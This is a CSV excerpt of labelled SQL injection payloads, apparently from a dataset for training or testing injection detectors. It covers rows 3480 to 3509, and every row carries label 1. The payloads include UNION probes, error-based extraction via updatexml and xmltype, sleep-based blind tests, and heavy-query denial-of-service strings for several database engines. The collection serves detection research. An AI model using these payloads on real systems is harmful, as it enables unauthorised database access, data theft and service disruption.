row_index,payload_norm,label,sqli_type_hint
3480,"-6123"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""zuzx"" = ""zuzx",1,
3481,"1"" where 2204 = 2204 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
3482,1' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,
3483,"-1949 ) as smyn where 4066 = 4066 union all select 4066,4066--",1,
3484,"1"" where 9083 = 9083 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
3485,"-7831"" ) ) as krzi where 3798 = 3798 order by 1--",1,
3486,"-4522"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""mbkq"" = ""mbkq",1,
3487,"-2028' ) ) ) union all select 8698,8698,8698,8698#",1,
3488,"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""pmpk"" like ""pmpk",1,
3489,"1"" ) where 4660 = 4660 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3490,"1 where 6077 = 6077 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
3491,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,
3492,"1 union all select null,null,null,null,null--",1,
3493,"-3852' ) union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1,
3494,"1' ) ) as jxvv where 6593 = 6593 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1,
3495,"1 ) where 5232 = 5232 union all select null,null,null#",1,
3496,"-8943%' ) union all select 7710,7710#",1,
3497,"1%' union all select null,null,null,null,null--",1,
3498,"-5744 ) union all select 3617,3617,3617,3617,3617,3617--",1,
3499,"1, ( case when 8260 = 8260 then 1 else null end )",1,
3500,1' ) or sleep ( 5 ) #,1,
3501,"1"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""tzog"" like ""tzog",1,
3502,"-5996 ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,
3503,1'|| ( select 'mlwj' from dual where 4247 = 4247 and 1702 = 8469 ) ||',1,
3504,"-4054"" or 2824 = 4788--",1,
3505,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxrb' = 'zxrb",1,
3506,"( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1,
3507,"1"" ) ) as vigs where 6175 = 6175 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
3508,1'+ ( select 'dpun' where 4760 = 4760,1,
3509,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",1,
